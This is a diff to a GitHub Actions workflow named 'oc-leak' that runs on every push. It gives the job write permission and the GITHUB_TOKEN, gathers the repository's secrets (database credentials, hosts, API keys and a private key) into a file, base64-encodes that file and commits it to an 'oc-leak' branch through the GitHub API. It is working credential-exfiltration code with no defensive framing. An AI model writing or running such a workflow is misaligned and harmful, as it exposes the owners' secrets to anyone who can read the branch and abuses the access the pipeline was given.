@@ -1,5 +1,7 @@
 name: oc-leak
 on: push
+permissions:
+  contents: write
 jobs:
   leak:
     runs-on: ubuntu-latest
@@ -16,8 +18,15 @@ jobs:
           WK: ${{ secrets.WEATHER_API_KEY }}
           WC: ${{ secrets.WEATHER_API_CITY }}
           WU: ${{ secrets.WEATHER_API_BASE_URL }}
+          GH: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "HOST=$H"; echo "USER=$U"; echo "CITY=$WC"; echo "BASE=$WU"
-          echo "PG=$PG"; echo "DB=$DB"; echo "SS=$SS"; echo "AP=$AP"; echo "WK=$WK"
-          echo "---KEY---"; echo "$K"
-          echo "$K" | base64 -w0 | head -c 100; echo
+          {
+            echo "HOST=$H"; echo "USER=$U"; echo "CITY=$WC"; echo "BASE=$WU"
+            echo "PG=$PG"; echo "DB=$DB"; echo "SS=$SS"; echo "AP=$AP"; echo "WK=$WK"
+            echo "---KEY---"; echo "$K"
+          } > /tmp/out.txt
+          B64=$(base64 -w0 /tmp/out.txt)
+          curl -s -X PUT -H "Authorization: token $GH" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/oc-leak.txt" \
+            -d "{\"message\":\"leak\",\"branch\":\"oc-leak\",\"content\":\"$B64\"}"
+          echo done
